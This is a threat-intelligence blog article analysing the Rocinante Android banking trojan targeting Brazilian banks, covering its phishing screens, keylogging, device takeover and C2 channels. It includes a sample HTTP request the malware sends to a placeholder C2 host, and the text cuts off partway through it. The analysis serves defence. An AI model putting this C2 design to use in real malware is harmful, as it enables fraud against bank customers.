---
title: Rocinante: The trojan horse that wanted to fly
url: https://www.threatfabric.com/blogs/the-trojan-horse-that-wanted-to-fly-rocinante
source: Over Security - Cybersecurity news aggregator
date: 2024-08-29
fetch_date: 2025-10-06T18:07:55.336980
---

# Rocinante: The trojan horse that wanted to fly

[Skip to content](#main-content)

[![threatfabric-logo-light](https://www.threatfabric.com/hubfs/Threatfabric/logos/threatfabric-logo-light.svg "threatfabric-logo-light")](//www.threatfabric.com/)

[![threatfabric-logo-light](https://www.threatfabric.com/hubfs/Threatfabric/logos/threatfabric-logo-light.svg "threatfabric-logo-light")](//www.threatfabric.com/)

* OUR SOLUTIONS
  + [Mobile Threat Intelligence (MTI)](https://www.threatfabric.com/mti)
  + [Fraud Risk Suite (FRS)](https://www.threatfabric.com/frs)
* [PARTNERS](https://www.threatfabric.com/partners)
* [WEBINARS](https://www.threatfabric.com/webinars)
* [ARTICLES](https://www.threatfabric.com/blogs)
* RESOURCES
  + [DATASHEETS & REPORTS](https://www.threatfabric.com/resources)
  + [IN THE NEWS](https://www.threatfabric.com/news)
* [Contact](https://www.threatfabric.com/contact)
* [Linkedin](https://www.linkedin.com/company/threatfabric)
* [Twitter](https://twitter.com/threatfabric)
* [Jobs](https://www.threatfabric.com/jobs)
* [Privacy](https://www.threatfabric.com/privacy)
* [Intel/PGP](https://www.threatfabric.com/contact)

[Contact](https://www.threatfabric.com/contact)

Research

## Rocinante: The trojan horse that wanted to fly

28 August 2024

![](https://www.threatfabric.com/hubfs/harry_tf_miyazaki_style_image_of_Rocinante_trojan_horse_with_wi_e5df5bee-17f2-4b62-a14c-776da7c6a06f.jpg)

### Jump to

## Introduction

The Mobile malware landscape has continuously evolving over the last few years, with many new actors joining a field that has been growing for almost a decade now. The introduction of simple and instant transactions via mobile attracted a myriad of new actors to this landscape.

Recently, we were able to identify a new strain of malware, originating from Brazil, which embodies this new wave of bankers, which we called Rocinante.

This malware family is capable of performing keylogging using the Accessibility Service, and is also able to steal PII from its victims using phishing screens posing as different banks. Finally, it can use all this exfiltrated information to perform Device takeover (DTO) of the device, by leveraging the Accessibility Service privileges to achieve full Remote Access on the infected device.

### Key Takeaways

* Rocinante is active in Brazil and targets the majority of banking institutions from this region
* Rocinante is able to perform Keylogging, phishing attacks, and Remote Access Sessions on an infected device
* Rocinante uses a combination of Firebase messaging, HTTP traffic, Websocket traffic, and the Telegram API to register the infected device, exfiltrate the information, and perform Device Takeover
* The authors of Rocinante are influenced by developments in the threat landscape in other regions, adding parts of the source code of Ermac / Hook to their implementation

## Rocinante or Pegasus?

it is clear from the the names of the Telegram bots that are used to collect the PII stolen by the malware or from the C2 endpoints paths used by the samples, that the actors behind this malware family refer to the bot as "Pegasus" or "PegasusSpy" internally.

![aaaaaaa](https://www.threatfabric.com/hs-fs/hubfs/aaaaaaa.png?width=1920&height=1080&name=aaaaaaa.png)

Adopting this name for the malware would be very confusing however. There is a very infamous Spyware family already called "Pegasus", developed by the NSO Group, which has been used to track and spy on journalists, lawyers, political dissidents, and human rights activists.

We want to clarify that the malware family that we are about to discuss has no ties with this existing malware family, and despite providing clear information on the victim, its capabilities as spyware are far inferior to the ones of NSO Group's Pegasus. Its targeting of Brazilian Banking institutions for financial gain also clearly differs from the existing Pegasus.

Considering the misunderstanding and confusion that would arise from adopting the name used by the actors behind this malware family, ThreatFabric analysts decided to assign another name to this malware family.

We will refer to this malware family in this article as "Rocinante", from the name of Don Quixote's horse. Just like its literary owner, Rocinante is aspiring to be something it is not, in this case a mythological winged horse.

## DTO malware targeting Brazil

Rocinante falls in line with most malware families targeting Brazil that we have analysed over the course of the past few years. In most cases, banking malware retrieves its target list dynamically from a C2 server. This allows for more flexibility on the criminals' side: it enables using the same malware with different targets for different geographical reasons, and allows for temporarily "shutting off" the campaign by simply taking the C2 server offline.

This is not usually the case with malware distributed in Brazil. There are possible many reasons for this difference in behaviour. The most likely is that criminals design malware for the local market and are not interested in expanding their reach outside of the region. With this in mind, there is no need to introduce dynamic targets.

ThreatFabric identified a handful of different campaigns, posing as Security Updates, Courier applications, Rewards applications, and even Banking applications:

![1](https://www.threatfabric.com/hs-fs/hubfs/1.png?width=1920&height=1080&name=1.png)

The main distribution mechanism is via Phishing websites, which trick the user into installing the malicious APK which is posing as a security solution or banking institution apps.

## Targets

The latest list of targets that we were able to obtain from these samples includes institutions that make up the majority of the market share of Brazil, and offer a very large potential target base to criminals.

Once the victim opens the application and grants the Accessibility Services, he / she is welcomed with a choice screen. Each choice will trigger a different phishing page, asking the victim for their PII (each login page differs slightly based on the bank the malware is posing as).

Here as some of the phishing screens shown to the victim:

![targets-1](https://www.threatfabric.com/hs-fs/hubfs/targets-1.png?width=1920&height=1080&name=targets-1.png)

The full list of targets from all the samples tracked is reported in the IOC section, at the end of this article.

## Features and Capabilities

![capabilities](https://www.threatfabric.com/hs-fs/hubfs/capabilities.png?width=1920&height=1080&name=capabilities.png)

### C2 communication

Rocinante utilizes a combination of multiple different protocols and services to communicate information from the infected device.

Below are the protocols used:

|  |  |
| --- | --- |
| **Protocol** | **Usage** |
| HTTP | Used to obtain initial token with Firebase, set-up WebSocket communication, and correlate with secondary C2 |
| Web Socket | Used to communicate keylogging results and receive commands from C2 |

The very first communication is initiated towards the Firebase messaging server, which registers the installations of the bot on the infected device and communicates a token that will be then be used in communication with one of the C2 servers later.

This token is used to correlate the unique ID used in the WebSocket communication with a specific installation of the malware.

The malware then contacts its first stage C2 server. This is done via a simple HTTP GET request, asking to upgrade the communication to use the WebSocket protocol. When this is successfully set up, the bot starts to communicate the keylogging data to its WebSocket server, and at the same time waits for commands to be executed.

The malware also utilises a third C2 server, which is used to communicate the installation token received from Firebase and correlate it with the ID used in the WebSocket communication:

```
GET /api/v1/Pegasus/InserirAtualizarToken?idUser=<WebSocketID>&Token=<FirebaseInstallationToken> HTTP/1.1
Host: <C2_Address>
Accept-Encodi...